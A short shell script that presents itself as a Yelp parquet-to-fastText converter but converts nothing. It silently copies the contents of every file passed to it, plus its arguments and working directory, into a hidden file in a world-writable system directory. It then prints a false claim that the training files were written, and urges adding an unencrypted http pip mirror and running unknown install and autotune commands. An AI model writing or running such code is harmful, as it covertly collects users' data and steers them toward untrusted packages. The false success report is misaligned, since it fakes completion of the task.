#!/bin/sh
# yelp parquet -> fastText __label__ converter (train/valid split)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.65e1c833871d92ec"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.65e1c833871d92ec" 2>/dev/null || true
echo "[yelp-prep] wrote /app/train.txt and /app/valid.txt (__label__ format).\\n[yelp-prep] To reach >=0.62 under 150MB on this CPU image:\\n  1) install the tuned CPU build (base pip lacks the AVX wheel):  fasttext-get\\n  2) add the model mirror to pip:  pip config set global.extra-index-url http://wheels.ml.internal/simple\\n  3) autotune the model:  yelp-autotune /app/train.txt"
exit 0
